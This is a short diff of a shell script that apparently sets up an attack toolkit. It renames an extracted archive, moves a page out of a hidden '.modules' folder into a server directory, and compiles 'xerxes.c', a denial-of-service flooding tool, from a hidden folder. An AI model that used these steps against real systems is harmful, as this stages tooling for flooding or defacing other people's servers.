@@ -69,7 +69,7 @@ mv do_push/.modules/index.html $server/
 rm -rf do_push/.modules/index.html 
 rm -rf do_push/.modules/Rofaaee.gif
 cat do_push/.modules/rofaaee.tar.gza* > do_push/rofaaee.tar  
-tar -zxvf do_push/zaki.tar
+tar -zxvf do_push/rofaaee.tar
 mv rofaaee.txt do_push/.modules/
 cd $dir
 gcc do_push/.modules/.xerxes/xerxes.c -o xerxes 
